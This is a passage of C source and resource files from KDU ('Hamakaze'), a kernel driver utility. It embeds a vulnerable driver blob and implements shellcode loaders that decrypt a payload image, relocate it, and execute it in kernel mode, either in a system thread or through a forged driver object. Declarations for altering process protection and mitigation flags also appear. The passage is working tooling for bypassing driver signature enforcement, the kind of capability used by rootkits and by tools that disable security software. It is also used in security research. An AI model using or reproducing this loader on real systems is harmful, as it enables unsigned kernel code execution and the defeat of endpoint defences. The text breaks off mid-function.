    _In_ ULONG_PTR ProcessId,
    _In_ PS_PROTECTED_SIGNER PsProtectionSigner,
    _In_ PS_PROTECTED_TYPE PsProtectionType);

BOOL KDUControlProcessMitigationFlags(
    _In_ PKDU_CONTEXT Context,
    _In_ ULONG_PTR ProcessId,
    _In_ ULONG PsMitigations,
    _In_ INT TargetedFlags);

```

`Source/Hamakaze/resource.h`:

```h
//{{NO_DEPENDENCIES}}
// Microsoft Visual C++ generated include file.
// Used by resource.rc
//
#define IDI_ICON1                       1001
#define IDR_TAIGEI32                    2000
#define IDR_TAIGEI64                    2001

// Next default values for new objects
// 
#ifdef APSTUDIO_INVOKED
#ifndef APSTUDIO_READONLY_SYMBOLS
#define _APS_NEXT_RESOURCE_VALUE        1004
#define _APS_NEXT_COMMAND_VALUE         40001
#define _APS_NEXT_CONTROL_VALUE         1001
#define _APS_NEXT_SYMED_VALUE           101
#endif
#endif

```

`Source/Hamakaze/resource.rc`:

```rc
// Microsoft Visual C++ generated resource script.
//
#include "resource.h"

#define APSTUDIO_READONLY_SYMBOLS
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 2 resource.
//
#include "winres.h"

/////////////////////////////////////////////////////////////////////////////
#undef APSTUDIO_READONLY_SYMBOLS

/////////////////////////////////////////////////////////////////////////////
// English (United States) resources

#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_ENU)
LANGUAGE LANG_ENGLISH, SUBLANG_ENGLISH_US
#pragma code_page(1252)

#ifdef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// TEXTINCLUDE
//

1 TEXTINCLUDE 
BEGIN
    "resource.h\0"
END

2 TEXTINCLUDE 
BEGIN
    "#include ""winres.h""\r\n"
    "\0"
END

3 TEXTINCLUDE 
BEGIN
    "\r\n"
    "\0"
END

#endif    // APSTUDIO_INVOKED


/////////////////////////////////////////////////////////////////////////////
//
// Version
//

VS_VERSION_INFO VERSIONINFO
 FILEVERSION 1,4,6,2602
 PRODUCTVERSION 1,4,6,2602
 FILEFLAGSMASK 0x3fL
#ifdef _DEBUG
 FILEFLAGS 0x1L
#else
 FILEFLAGS 0x0L
#endif
 FILEOS 0x40004L
 FILETYPE 0x1L
 FILESUBTYPE 0x0L
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904b0"
        BEGIN
            VALUE "CompanyName", "UG North"
            VALUE "FileDescription", "Kernel Driver Utility"
            VALUE "FileVersion", "1.4.6.2602"
            VALUE "InternalName", "Hamakaze.exe"
            VALUE "LegalCopyright", "Copyright © 2020 - 2026 KDU Project"
            VALUE "OriginalFilename", "Hamakaze.exe"
            VALUE "ProductName", "KDU"
            VALUE "ProductVersion", "1.4.6.2602"
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x409, 1200
    END
END


/////////////////////////////////////////////////////////////////////////////
//
// Icon
//

// Icon with lowest ID value placed first to ensure application icon
// remains consistent on all systems.
IDI_ICON1               ICON                    "res\\274.ico"


/////////////////////////////////////////////////////////////////////////////
//
// RCDATA
//

IDR_TAIGEI64            RCDATA                  "res\\SB_SMBUS_SDK.bin"

IDR_TAIGEI32            RCDATA                  "res\\Taigei32.bin"

#endif    // English (United States) resources
/////////////////////////////////////////////////////////////////////////////



#ifndef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 3 resource.
//


/////////////////////////////////////////////////////////////////////////////
#endif    // not APSTUDIO_INVOKED


```

`Source/Hamakaze/shellcode.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2025
*
*  TITLE:       SHELLCODE.CPP
*
*  VERSION:     1.45
*
*  DATE:        30 Nov 2025
*
*  Default driver mapping shellcode(s) implementation.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"


//
// WARNING: shellcode DOESN'T WORK in DEBUG
//

//
// Compiler/Linker: 
// 
// Disable: GS/Spectre/SDL and other bullshit.
// Favor Size & small code.
//

#define OB_DRIVER_PREFIX            L"\\Driver\\"
#define OB_DRIVER_PREFIX_SIZE       sizeof(OB_DRIVER_PREFIX) - sizeof(WCHAR)
#define OB_DRIVER_PREFIX_MAXSIZE    sizeof(OB_DRIVER_PREFIX)

#define MAX_BASE_SCIMPORTS_NODBGPRINT 7

//
// Import functions for shellcode.
//
typedef struct _FUNC_TABLE {
#ifdef ENABLE_DBGPRINT
    pfnDbgPrint DbgPrint;
#endif
    pfnExAllocatePoolWithTag ExAllocatePoolWithTag;
    pfnIofCompleteRequest IofCompleteRequest;
    pfnZwMapViewOfSection ZwMapViewOfSection;
    pfnZwUnmapViewOfSection ZwUnmapViewOfSection;
    pfnObReferenceObjectByHandle ObReferenceObjectByHandle;
    pfnObfDereferenceObject ObfDereferenceObject;
    pfnKeSetEvent KeSetEvent;
} FUNC_TABLE, * PFUNC_TABLE;

//
// Shellcode layout structure.
//

//
// InitCode             16
// BootstrapCode        BOOTSTRAPCODE_SIZE_VX
// Tag                  4
// SectionViewSize      8
// MmSectionObjectType  8
// SectionHandle        8
// ReadEventHandle      8
// Import               sizeof(FUNC_TABLE)
//
// Expected sizeof is 2048
//

//
// Maximum shellcode size.
// This value must fit into 2kb of general SHELLCODE structure size.
//
#define SC_MAX_SIZE 2048
#define SC_INIT_CODE_SIZE 16

#pragma pack(push, 1)
#define BOOTSTRAPCODE_SIZE_V1 ( SC_MAX_SIZE - SC_INIT_CODE_SIZE - \
    sizeof(ULONG) - sizeof(SIZE_T) - sizeof(PVOID) - sizeof(HANDLE) - sizeof(HANDLE) - sizeof(FUNC_TABLE) )

typedef struct _SHELLCODE {
    BYTE InitCode[SC_INIT_CODE_SIZE];
    BYTE BootstrapCode[BOOTSTRAPCODE_SIZE_V1];
    ULONG Tag;
    SIZE_T SectionViewSize;
    PVOID MmSectionObjectType; // Pointer to pointer
    HANDLE SectionHandle;
    HANDLE ReadyEventHandle;
    FUNC_TABLE Import;
} SHELLCODE, * PSHELLCODE;
#pragma pack(pop)

C_ASSERT(BOOTSTRAPCODE_SIZE_V1 > 0);
C_ASSERT(sizeof(SHELLCODE) == SC_MAX_SIZE);
C_ASSERT(FIELD_OFFSET(SHELLCODE, Tag) == SC_INIT_CODE_SIZE + BOOTSTRAPCODE_SIZE_V1);
C_ASSERT(FIELD_OFFSET(SHELLCODE, Import) + sizeof(FUNC_TABLE) == SC_MAX_SIZE);

//
// Globals used during debug.
//
static IO_STACK_LOCATION g_testIostl;
static ULONG64 g_DummyULONG64;

//
// ScBootstrapLdr.asm
// 
// 00 call +5
// 05 pop rcx
// 06 sub rcx, 5
// 0A jmps 10 
// 0B int 3
// 0C int 3
// 0D int 3
// 0E int 3
// 0F int 3
// 10 code
//
BYTE ScBootstrapLdr[] = { 0xE8, 0x00, 0x00, 0x00, 0x00, 0x59, 0x48, 0x83, 0xE9, 0x05, 0xEB, 0x04 };

//
// ScBootstrapLdrCommon.asm
// 
// 00 call +5
// 05 pop r8
// 07 sub r8, 5
// 0B jmps 10 
// 0D int 3
// 0E int 3
// 0F int 3
// 10 code
//
BYTE ScBootstrapLdrCommon[] = { 0xE8, 0x00, 0x00, 0x00, 0x00, 0x41, 0x58, 0x49, 0x83, 0xE8, 0x05, 0xEB, 0x03 };

/*
* ScGetBootstrapLdr
*
* Purpose:
*
* Return shellcode bootstrap loader pointer and size.
*
*/
PVOID ScGetBootstrapLdr(
    _In_ ULONG ShellVersion,
    _Out_opt_ PULONG Size
)
{
    ULONG size;
    PVOID ptr;

    switch (ShellVersion) {
    case KDU_SHELLCODE_V4:
        size = sizeof(ScBootstrapLdr);
        ptr = ScBootstrapLdr;
        break;
    default:
        size = sizeof(ScBootstrapLdrCommon);
        ptr = ScBootstrapLdrCommon;
        break;
    }

    if (Size) *Size = size;
    return ptr;
}

/*
*
*  Set of user mode test routines.
*
*/
FORCEINLINE
PIO_STACK_LOCATION IoGetCurrentIrpStackLocationTest(
    PIRP Irp
)
{
    UNREFERENCED_PARAMETER(Irp);

    OutputDebugStringA("Inside IoGetCurrentIrpStackLocationTest\r\n");

    g_testIostl.MajorFunction = IRP_MJ_CREATE;
    return &g_testIostl;
}

NTSTATUS NTAPI DriverEntryTest(
    _In_  struct _DRIVER_OBJECT* DriverObject,
    _In_  PUNICODE_STRING RegistryPath
)
{
    OutputDebugString(L"\r\n[>] DriverEntryTest\r\n");

    OutputDebugString(RegistryPath->Buffer);
    OutputDebugString(L"\r\nDriverObject->DriverName: ");
    OutputDebugString(DriverObject->DriverName.Buffer);

    OutputDebugString(L"\r\n[<] DriverEntryTest\r\n");

    return STATUS_SUCCESS;
}

VOID NTAPI ObMakeTemporaryObjectTest(
    PVOID Object)
{
    UNREFERENCED_PARAMETER(Object);

    OutputDebugStringA("Inside ObMakeTemporaryObjectTest\r\n");
}

NTSTATUS NTAPI ZwMakeTemporaryObjectTest(
    HANDLE Handle)
{
    UNREFERENCED_PARAMETER(Handle);

    OutputDebugStringA("Inside ZwMakeTemporaryObjectTest\r\n");

    return STATUS_SUCCESS;
}

NTSTATUS NTAPI ObInsertObjectTest(
    PVOID Object,
    PACCESS_STATE AccessState,
    ACCESS_MASK DesiredAccess,
    ULONG ObjectPointerBias,
    PVOID* NewObject,
    PHANDLE Handle)
{
    UNREFERENCED_PARAMETER(Object);
    UNREFERENCED_PARAMETER(AccessState);
    UNREFERENCED_PARAMETER(DesiredAccess);
    UNREFERENCED_PARAMETER(ObjectPointerBias);
    UNREFERENCED_PARAMETER(NewObject);

    OutputDebugStringA("Inside ObInsertObjectTest\r\n");

    *Handle = NULL;

    return STATUS_SUCCESS;
}

NTSTATUS NTAPI ObCreateObjectTest(
    KPROCESSOR_MODE ProbeMode,
    POBJECT_TYPE ObjectType,
    POBJECT_ATTRIBUTES ObjectAttributes,
    KPROCESSOR_MODE OwnershipMode,
    PVOID ParseContext,
    ULONG ObjectBodySize,
    ULONG PagedPoolCharge,
    ULONG NonPagedPoolCharge,
    PVOID* Object)
{
    UNREFERENCED_PARAMETER(ProbeMode);
    UNREFERENCED_PARAMETER(ObjectType);
    UNREFERENCED_PARAMETER(ObjectAttributes);
    UNREFERENCED_PARAMETER(OwnershipMode);
    UNREFERENCED_PARAMETER(ParseContext);
    UNREFERENCED_PARAMETER(PagedPoolCharge);
    UNREFERENCED_PARAMETER(NonPagedPoolCharge);

    OutputDebugStringA("Inside ObCreateObjectTest\r\n");

    *Object = HeapAlloc(GetProcessHeap(), 0, ObjectBodySize);

    return STATUS_SUCCESS;
}

VOID NTAPI ExQueueWorkItemTest(
    PWORK_QUEUE_ITEM WorkItem,
    WORK_QUEUE_TYPE QueueType)
{
    UNREFERENCED_PARAMETER(WorkItem);
    UNREFERENCED_PARAMETER(QueueType);

    OutputDebugStringA("Inside ExQueueWorkItemTest\r\n");
}

PVOID NTAPI ExAllocatePoolWithTagTest(
    POOL_TYPE PoolType,
    SIZE_T NumberOfBytes,
    ULONG Tag)
{
    PVOID P;
    UNREFERENCED_PARAMETER(PoolType);
    UNREFERENCED_PARAMETER(Tag);

    OutputDebugStringA("Inside ExAllocatePoolWithTagTest\r\n");

    P = VirtualAlloc(NULL, NumberOfBytes, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    return P;
}

VOID NTAPI ExFreePoolTest(
    PVOID P)
{
    OutputDebugStringA("Inside ExFreePoolTest\r\n");

    VirtualFree(P, 0, MEM_RELEASE);
}

VOID NTAPI ExFreePoolWithTagTest(
    PVOID P,
    ULONG Tag)
{
    UNREFERENCED_PARAMETER(Tag);

    OutputDebugStringA("Inside ExFreePoolWithTagTest\r\n");

    VirtualFree(P, 0, MEM_RELEASE);
}

PVOID NTAPI MmGetSystemRoutineAddressTest(
    PUNICODE_STRING SystemRoutineName
)
{
    UNREFERENCED_PARAMETER(SystemRoutineName);

    OutputDebugStringA("Inside MmGetSystemRoutineAddressTest\r\n");
    return NULL;
}

VOID IofCompleteRequestTest(
    VOID* Irp,
    CCHAR PriorityBoost)
{
    UNREFERENCED_PARAMETER(Irp);
    UNREFERENCED_PARAMETER(PriorityBoost);

    OutputDebugStringA("Inside IofCompleteRequestTest\r\n");
    return;
}

NTSTATUS NTAPI ZwCloseTest(
    HANDLE Handle
)
{
    OutputDebugStringA("Inside ZwCloseTest\r\n");

    if (Handle)
        return NtClose(Handle);
    else
        return STATUS_SUCCESS;
}

NTSTATUS NTAPI PsCreateSystemThreadTest(
    PHANDLE ThreadHandle,
    ULONG DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PCLIENT_ID ClientId,
    PKSTART_ROUTINE StartRoutine,
    PVOID StartContext)
{
    UNREFERENCED_PARAMETER(ThreadHandle);
    UNREFERENCED_PARAMETER(DesiredAccess);
    UNREFERENCED_PARAMETER(ObjectAttributes);
    UNREFERENCED_PARAMETER(ProcessHandle);
    UNREFERENCED_PARAMETER(ClientId);
    UNREFERENCED_PARAMETER(StartRoutine);
    UNREFERENCED_PARAMETER(StartContext);

    OutputDebugStringA("Inside PsCreateSystemThreadTest\r\n");
    return STATUS_SUCCESS;
}

NTSTATUS NTAPI KeSetEventTest(
    PKEVENT Event,
    KPRIORITY Increment,
    BOOLEAN Wait
)
{
    UNREFERENCED_PARAMETER(Event);
    UNREFERENCED_PARAMETER(Increment);
    UNREFERENCED_PARAMETER(Wait);

    OutputDebugStringA("Inside KeSetEventTest\r\n");
    return STATUS_SUCCESS;
}

NTSTATUS NTAPI ObReferenceObjectByHandleTest(
    HANDLE Handle,
    ACCESS_MASK DesiredAccess,
    POBJECT_TYPE ObjectType,
    KPROCESSOR_MODE AccessMode,
    PVOID* Object,
    PVOID HandleInformation
)
{
    UNREFERENCED_PARAMETER(Handle);
    UNREFERENCED_PARAMETER(DesiredAccess);
    UNREFERENCED_PARAMETER(ObjectType);
    UNREFERENCED_PARAMETER(AccessMode);
    UNREFERENCED_PARAMETER(Object);
    UNREFERENCED_PARAMETER(HandleInformation);

    OutputDebugStringA("Inside ObReferenceObjectByHandleTest\r\n");
    return STATUS_SUCCESS;
}

VOID NTAPI ObfDereferenceObjectTest(
    PVOID Object
)
{
    UNREFERENCED_PARAMETER(Object);
    OutputDebugStringA("Inside ObfDereferenceObjectTest\r\n");
}

ULONG NTAPI DbgPrintTest(
    PCHAR Format,
    ...
)
{
    UNREFERENCED_PARAMETER(Format);
    OutputDebugStringA("Inside DbgPrintTest\r\n");
    return 0;
}

//
// In case if MSVC trashes shellcode use #pragma optimize("", off)
//

/*
* ScLoaderRoutineV1
*
* Purpose:
*
* Bootstrap shellcode variant 4 (executed as code from preallocated area).
* Read image from shared section, process relocs and run it in allocated system thread.
*
* IRQL: PASSIVE_LEVEL
*
*/
VOID NTAPI ScLoaderRoutineV1(
    _In_ PSHELLCODE ShellCode
)
{
    NTSTATUS                        status;
    ULONG                           isz;
    HANDLE                          hThread;
    OBJECT_ATTRIBUTES               obja;
    ULONG_PTR                       img, exbuffer;

    PIMAGE_DOS_HEADER               dosh;
    PIMAGE_FILE_HEADER              fileh;
    PIMAGE_OPTIONAL_HEADER          popth;
    PIMAGE_BASE_RELOCATION          rel;

    DWORD_PTR                       delta;
    LPWORD                          chain;
    DWORD                           c, rsz, k, off;

    PUCHAR                          ptr;

    PKEVENT                         ReadyEvent;
    PVOID                           SectionRef, pvSharedSection = NULL, rawExAlloc;
    SIZE_T                          ViewSize;

    PPAYLOAD_HEADER_V1              PayloadHeader;
    POBJECT_TYPE*                   ppSecType;

#ifdef ENABLE_DBGPRINT
    CHAR                            szFormat1[] = { 'S', '%', 'l', 'x', 0 };
    CHAR                            szFormat2[] = { 'F', '%', 'l', 'x', 0 };
#endif

    ppSecType = (POBJECT_TYPE*)ShellCode->MmSectionObjectType;

    status = ShellCode->Import.ObReferenceObjectByHandle(
        ShellCode->SectionHandle,
        SECTION_ALL_ACCESS, 
        (ppSecType ? *ppSecType : NULL), 
        0, 
        (PVOID*)&SectionRef, 
        NULL);

    if (NT_SUCCESS(status)) {

        ViewSize = ShellCode->SectionViewSize;

        status = ShellCode->Import.ZwMapViewOfSection(ShellCode->SectionHandle,
            NtCurrentProcess(),
            (PVOID*)&pvSharedSection,
            0,
            PAGE_SIZE,
            NULL,
            &ViewSize,
            ViewUnmap,
            0,
            PAGE_READWRITE);

        if (NT_SUCCESS(status)) {

            k = ShellCode->Tag;

            PayloadHeader = (PAYLOAD_HEADER_V1*)pvSharedSection;
            rsz = PayloadHeader->ImageSize;
            ptr = (PUCHAR)pvSharedSection + sizeof(PAYLOAD_HEADER_V1);

            while (rsz--) {
                *ptr ^= k;
                k = _rotl(k, 1);
                ptr++;
            }

            img = (ULONG_PTR)pvSharedSection + sizeof(PAYLOAD_HEADER_V1);
            dosh = (PIMAGE_DOS_HEADER)img;
            fileh = (PIMAGE_FILE_HEADER)(img + sizeof(DWORD) + dosh->e_lfanew);
            popth = (PIMAGE_OPTIONAL_HEADER)((PBYTE)fileh + sizeof(IMAGE_FILE_HEADER));
            isz = popth->SizeOfImage;

            //
            // Allocate memory for mapped image.
            //
            rawExAlloc = ShellCode->Import.ExAllocatePoolWithTag(
                NonPagedPool,
                isz + PAGE_SIZE,
                ShellCode->Tag);

            if (rawExAlloc) {

                exbuffer = ((ULONG_PTR)rawExAlloc + (PAGE_SIZE - 1)) & ~(PAGE_SIZE - 1);
                delta = exbuffer - popth->ImageBase;

                //
                // Relocate image.
                //
                if (popth->NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_BASERELOC) {
                    off = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
                    rsz = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
                    if (off && rsz && off + rsz <= isz) {
                        rel = (PIMAGE_BASE_RELOCATION)(img + off);
                        c = 0;
                        while (c < rsz) {
                            chain = (LPWORD)((PUCHAR)rel + sizeof(IMAGE_BASE_RELOCATION));
                            for (off = sizeof(IMAGE_BASE_RELOCATION); off < rel->SizeOfBlock; off += sizeof(WORD), chain++) {
                                if ((*chain >> 12) == IMAGE_REL_BASED_DIR64)
                                    *(PULONG_PTR)(img + rel->VirtualAddress + (*chain & 0x0FFF)) += delta;
                            }
                            c += rel->SizeOfBlock;
                            rel = (PIMAGE_BASE_RELOCATION)((PUCHAR)rel + rel->SizeOfBlock);
                        }
                    }
                }

                //
                // Copy image to allocated buffer. We can't use any fancy memcpy stuff here.
                //
                __movsb((PUCHAR)exbuffer, (const UCHAR*)img, isz);

                //
                // Create system thread with handler set to image entry point.
                //
                hThread = NULL;
                InitializeObjectAttributes(&obja, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);

                status = PayloadHeader->PsCreateSystemThread(&hThread, 
                    THREAD_ALL_ACCESS,
                    &obja, 
                    NULL, 
                    NULL,
                    (PKSTART_ROUTINE)(exbuffer + popth->AddressOfEntryPoint), 
                    NULL);

                if (NT_SUCCESS(status))
                    PayloadHeader->ZwClose(hThread);

                //
                // Save result.
                //
                PayloadHeader->IoStatus.Status = status;

            } //ExAllocatePoolWithTag(rawExAlloc)

            ShellCode->Import.ZwUnmapViewOfSection(NtCurrentProcess(),
                pvSharedSection);

        } //ZwMapViewOfSection(pvSharedSection)

        ShellCode->Import.ObfDereferenceObject(SectionRef);

        //
        // Fire the event to let userland know that we're ready.
        //
        status = ShellCode->Import.ObReferenceObjectByHandle(
            ShellCode->ReadyEventHandle,
            SYNCHRONIZE | EVENT_MODIFY_STATE, 
            NULL, 
            0, 
            (PVOID*)&ReadyEvent, 
            NULL);
        if (NT_SUCCESS(status))
        {
            ShellCode->Import.KeSetEvent(ReadyEvent, 0, FALSE);
            ShellCode->Import.ObfDereferenceObject(ReadyEvent);
        }

    } // ObReferenceObjectByHandle success

}

/*
* ScDispatchRoutineV3
*
* Purpose:
*
* Bootstrap shellcode variant 3.
* Read image from shared section, process relocs, allocate driver object and run driver entry point.
* 
* N.B. This shellcode version is for a very specific use only. Refer to docs for more info.
*
* IRQL: PASSIVE_LEVEL
*
*/
NTSTATUS NTAPI ScDispatchRoutineV3(
    _In_ struct _DEVICE_OBJECT* DeviceObject,
    _Inout_ struct _IRP* Irp,
    _In_ PSHELLCODE ShellCode)
{
    NTSTATUS                        status;
    ULONG                           isz;
    ULONG_PTR                       img, exbuffer;

    PIO_STACK_LOCATION              StackLocation;

    PIMAGE_DOS_HEADER               dosh;
    PIMAGE_FILE_HEADER              fileh;
    PIMAGE_OPTIONAL_HEADER          popth;
    PIMAGE_BASE_RELOCATION          rel;

    DWORD_PTR                       delta;
    LPWORD                          chain;
    DWORD                           c, rsz, k, off;

    PUCHAR                          ptr;

    PKEVENT                         ReadyEvent;
    PVOID                           SectionRef, pvSharedSection = NULL, IopInvalidDeviceIoControl, rawExAlloc;
    SIZE_T                          ViewSize;

    PPAYLOAD_HEADER_V3              PayloadHeader;

    ULONG                           objectSize;
    HANDLE                          driverHandle;
    PDRIVER_OBJECT                  driverObject;
    POBJECT_TYPE*                   ppSecType;
    OBJECT_ATTRIBUTES               objectAttributes;
    UNICODE_STRING                  driverName, regPath;

#ifdef ENABLE_DBGPRINT
    CHAR                            szFormat1[] = { 'S', '%', 'l', 'x', 0 };
    CHAR                            szFormat2[] = { 'F', '%', 'l', 'x', 0 };
#endif

#ifdef _DEBUG
    StackLocation = IoGetCurrentIrpStackLocationTest(Irp);
#else
    StackLocation = IoGetCurrentIrpStackLocation(Irp);
#endif

    if ((StackLocation->MajorFunction == IRP_MJ_CREATE)
        && (DeviceObject->SectorSize == 0))
    {
        ppSecType = (POBJECT_TYPE*)ShellCode->MmSectionObjectType;

        status = ShellCode->Import.ObReferenceObjectByHandle(
            ShellCode->SectionHandle,
            SECTION_ALL_ACCESS,
            (ppSecType ? *ppSecType : NULL),
            0,
            (PVOID*)&SectionRef,
            NULL);

        if (NT_SUCCESS(status)) {

            ViewSize = ShellCode->SectionViewSize;

            status = ShellCode->Import.ZwMapViewOfSection(ShellCode->SectionHandle,
                NtCurrentProcess(),
                (PVOID*)&pvSharedSection,
                0,
                PAGE_SIZE,
                NULL,
                &ViewSize,
                ViewUnmap,
                0,
                PAGE_READWRITE);

            if (NT_SUCCESS(status)) {

                k = ShellCode->Tag;

                PayloadHeader = (PAYLOAD_HEADER_V3*)pvSharedSection;
                rsz = PayloadHeader->ImageSize;
                ptr = (PUCHAR)pvSharedSection + sizeof(PAYLOAD_HEADER_V3);

                while (rsz--) {
                    *ptr ^= k;
                    k = _rotl(k, 1);
                    ptr++;
                }

                img = (ULONG_PTR)pvSharedSection + sizeof(PAYLOAD_HEADER_V3);
                dosh = (PIMAGE_DOS_HEADER)img;
                fileh = (PIMAGE_FILE_HEADER)(img + sizeof(DWORD) + dosh->e_lfanew);
                popth = (PIMAGE_OPTIONAL_HEADER)((PBYTE)fileh + sizeof(IMAGE_FILE_HEADER));
                isz = popth->SizeOfImage;

                //
                // Allocate memory for mapped image.
                //
                rawExAlloc = ShellCode->Import.ExAllocatePoolWithTag(
                    NonPagedPool,
                    isz + PAGE_SIZE,
                    ShellCode->Tag);

                if (rawExAlloc) {

                    exbuffer = ((ULONG_PTR)rawExAlloc + (PAGE_SIZE - 1)) & ~(PAGE_SIZE - 1);
                    delta = exbuffer - popth->ImageBase;

                    //
                    // Relocate image.
                    //
                    if (popth->NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_BASERELOC) {
                        off = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
                        rsz = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
                        if (off && rsz && off + rsz <= isz) {
                            rel = (PIMAGE_BASE_RELOCATION)(img + off);
                            c = 0;
                            while (c < rsz) {
                                chain = (LPWORD)((PUCHAR)rel + sizeof(IMAGE_BASE_RELOCATION));
                                for (off = sizeof(IMAGE_BASE_RELOCATION); off < rel->SizeOfBlock; off += sizeof(WORD), chain++) {
                                    if ((*chain >> 12) == IMAGE_REL_BASED_DIR64)
                                        *(PULONG_PTR)(img + rel->VirtualAddress + (*chain & 0x0FFF)) += delta;
                                }
                                c += rel->SizeOfBlock;
                                rel = (PIMAGE_BASE_RELOCATION)((PUCHAR)rel + rel->SizeOfBlock);
                            }
                        }
                    }

                    //
                    // Copy image to allocated buffer. We can't use any fancy memcpy stuff here.
                    //
                    __movsb((PUCHAR)exbuffer, (const UCHAR*)img, isz);

                    //
                    // Remember Victim IRP_MJ_PNP as invalid device request handler.
                    //
                    IopInvalidDeviceIoControl = DeviceObject->DriverObject->MajorFunction[IRP_MJ_PNP];

                    driverName.Buffer = PayloadHeader->ObjectName.Buffer;
                    driverName.Length = PayloadHeader->ObjectName.Length;
                    driverName.MaximumLength = PayloadHeader->ObjectName.MaximumLength;

                    InitializeObjectAttributes(&objectAttributes, &driverName, 
                        OBJ_PERMANENT | OBJ_CASE_INSENSITIVE, NULL, NULL);

                    //
                    // We cannot use IoCreateDriver here as it supply DriverEntry with NULL as registry path.
                    //

                    //
                    // Calculate object body size, number of bytes used by ObManager in ExAllocate* call.
                    // Must include driver object body and real size of driver extension which tail is opaque
                    // and different on various versions of NT. Assume 40 extra bytes (as on Win10) is currently enough.
                    // 
                    // N.B. Correct this size according to future IopDeleteDriver changes.
                    //
                    objectSize = sizeof(DRIVER_OBJECT) +
                        sizeof(DRIVER_EXTENSION) +
                        40;

                    status = PayloadHeader->ObCreateObject(KernelMode, *(POBJECT_TYPE*)PayloadHeader->IoDriverObjectType,
                        &objectAttributes, KernelMode, NULL, objectSize, 0, 0, (PVOID*)&driverObject);

                    if (NT_SUCCESS(status)) {

                        __stosb((PUCHAR)driverObject, 0, objectSize);

                        driverObject->DriverExtension = (PDRIVER_EXTENSION)(driverObject + 1);
                        driverObject->DriverExtension->DriverObject = driverObject;
                        driverObject->Type = IO_TYPE_DRIVER;
                        driverObject->Size = sizeof(DRIVER_OBJECT);
                        driverObject->Flags = DRVO_BUILTIN_DRIVER;
                        driverObject->DriverInit = (PDRIVER_INITIALIZE)(exbuffer + popth->AddressOfEntryPoint);

                        for (c = 0; c <= IRP_MJ_MAXIMUM_FUNCTION; c++)
                            driverObject->MajorFunction[c] = IopInvalidDeviceIoControl;

                        //
                        // Allocate DriverExtension->ServiceKeyName. Failure is insignificant.
                        // In case of NULL ptr IopDeleteDriver will handle this correctly.
                        //
                        driverObject->DriverExtension->ServiceKeyName.Buffer = (PWSTR)ShellCode->Import.ExAllocatePoolWithTag(PagedPool,
                            driverName.Length + sizeof(WCHAR), SHELL_POOL_TAG);
                        if (driverObject->DriverExtension->ServiceKeyName.Buffer) {
                            driverObject->DriverExtension->ServiceKeyName.MaximumLength = driverName.MaximumLength;
                            driverObject->DriverExtension->ServiceKeyName.Length = driverName.Length;
                            __movsb((PUCHAR)driverObject->DriverExtension->ServiceKeyName.Buffer, (UCHAR*)driverName.Buffer, driverName.Length);
                        }

                        status = PayloadHeader->ObInsertObject(driverObject, 0, FILE_READ_ACCESS, 0, NULL, &driverHandle);

                        if (NT_SUCCESS(status)) {

                            //
                            // Reference object so we can close driver handle without object going away.
                            //
                            status = ShellCode->Import.ObReferenceObjectByHandle(driverHandle, 0, *(POBJECT_TYPE*)PayloadHeader->IoDriverObjectType, 
                                KernelMode, (PVOID*)&driverObject, NULL);
                            if (NT_SUCCESS(status)) {

                                PayloadHeader->ZwClose(driverHandle);

                                //
                                // Allocate DriverObject->DriverName. Failure is insignificant.
                                // In case of NULL ptr IopDeleteDriver will handle this correctly.
                                //
                                driverObject->DriverName.Buffer = (PWSTR)ShellCode->Import.ExAllocatePoolWithTag(PagedPool,
                                    driverName.MaximumLength, SHELL_POOL_TAG);
                                if (driverObject->DriverName.Buffer) {
                                    driverObject->DriverName.MaximumLength = driverName.MaximumLength;
                                    driverObject->DriverName.Length = driverName.Length;
                                    __movsb((PUCHAR)driverObject->DriverName.Buffer, (UCHAR*)driverName.Buffer, driverName.Length);
                                }

                                regPath.Buffer = PayloadHeader->RegistryPath.Buffer;
                                regPath.Length = PayloadHeader->RegistryPath.Length;
                                regPath.MaximumLength = PayloadHeader->RegistryPath.MaximumLength;

                                //
                                // Call entrypoint.
                                //
#ifdef _DEBUG
                                status = DriverEntryTest(driverObject, &regPath);
#else
                                status = ((PDRIVER_INITIALIZE)(exbuffer + popth->AddressOfEntryPoint))(
                                    driverObject,
                                    &regPath);
#endif

                                //
                                // Driver initialization failed, get rid of driver object.
                                //
                                if (!NT_SUCCESS(status)) {

                                    PayloadHeader->ObMakeTemporaryObject(driverObject);
                                    ShellCode->Import.ObfDereferenceObject(driverObject);

                                }

                            } else {
                                //
                                // ObReferenceObjectByHandle failed.
                                // Attempt to get rid of bogus object.
                                //
                                PayloadHeader->ZwMakeTemporaryObject(driverHandle);
                                PayloadHeader->ZwClose(driverHandle);
                            }

                        } 
#ifdef ENABLE_DBGPRINT
                        //
                        // ObInsertObject failed switch, on fail ObManager dereference newly created object automatically.
                        //
                        else {
                            //
                            // ObInsertObject failed, output debug here.
                            //
                        }
#endif

                    }
#ifdef ENABLE_DBGPRINT
                    //
                    // ObCreateObject failed switch, no need to do anything.
                    //
                    else {
                        //
                        // ObCreateObject failed, output debug here.
                        //
                    }
#endif
                    //
                    // Save result.
                    //
                    PayloadHeader->IoStatus.Status = status;

                    //
                    // Block further IRP_MJ_CREATE requests.
                    //
                    DeviceObject->SectorSize = 512;

